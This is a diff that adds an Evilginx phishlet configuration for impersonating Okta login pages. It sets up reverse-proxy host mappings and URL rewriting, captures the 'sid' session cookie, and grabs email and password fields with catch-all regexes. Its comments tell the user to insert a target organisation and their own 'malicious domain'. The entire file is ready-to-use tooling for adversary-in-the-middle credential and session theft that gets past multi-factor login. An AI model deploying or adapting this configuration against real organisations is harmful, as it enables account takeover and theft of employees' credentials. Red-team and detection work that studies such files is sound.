@@ -1,0 +1,25 @@
+name: 'okta'
+author: '@ml_siegel'
+min_ver: '2.1.0'
+# Replace EXAMPLE with the target org. ie ACME for acme.okta.com
+# Replace the auth_token domain with your malicious domain ie acmeokta.com 
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'okta.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'okta.com', session: true, is_landing: true }
+  - {phish_sub: 'EXAMPLE', orig_sub: 'EXAMPLE', domain: 'okta.com', session: true, is_landing: true}
+sub_filters:
+  - {hostname: 'EXAMPLE.okta.com', sub: 'EXAMPLE', domain: 'okta.com', search: 'https://{hostname}/api', replace: 'https://{hostname}/api', mimes: ['text/html', 'application/json']}
+  - {hostname: 'login.okta.com', sub: 'login', domain: 'okta.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {hostname: 'EXAMPLE.okta.com', sub: '', domain: 'EXAMPLE.okta.com', search: 'https\\x3A\\x2F\\x2F{hostname}', replace: 'https\x3A\x2F\x2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript']}
+  - {hostname: 'EXAMPLE.okta.com', sub: '', domain: 'EXAMPLE.okta.com', search: '\\x2Fuser\\x2Fnotifications', replace: 'https\x3A\x2F\x2FEXAMPLE.okta.com\x2Fuser\x2Fnotifications', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript']}
+auth_tokens:
+  - domain: 'EXAMPLEokta.com'
+    keys: ['sid']
+user_regex:
+  key: 'email'
+  re: '(.*)'
+pass_regex:
+  key: 'password'
+  re: '(.*)'
+landing_path:
+  - '/login/login.htm'
